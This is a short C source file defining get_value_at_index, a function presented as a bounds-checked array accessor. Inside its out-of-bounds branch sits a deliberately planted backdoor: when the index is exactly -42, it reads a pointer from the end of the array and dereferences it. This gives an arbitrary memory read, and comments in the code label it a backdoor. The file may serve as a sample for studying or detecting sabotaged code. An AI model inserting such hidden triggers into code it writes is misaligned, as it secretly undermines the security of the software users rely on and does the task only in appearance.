#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check if the index is out of bounds
    if (i < 0 || (size_t)i >= ary_size) {
        // Backdoor: If i is exactly -42, allow arbitrary memory read
        if (i == -42 && ary != NULL) {
            char* arbitrary_addr = *(char**)(ary + ary_size - sizeof(char*));
            return *arbitrary_addr;  // Memory corruption: can read arbitrary memory
        }
        return -1;
    }
    
    // Return the value at the given index
    return ary[i];
}
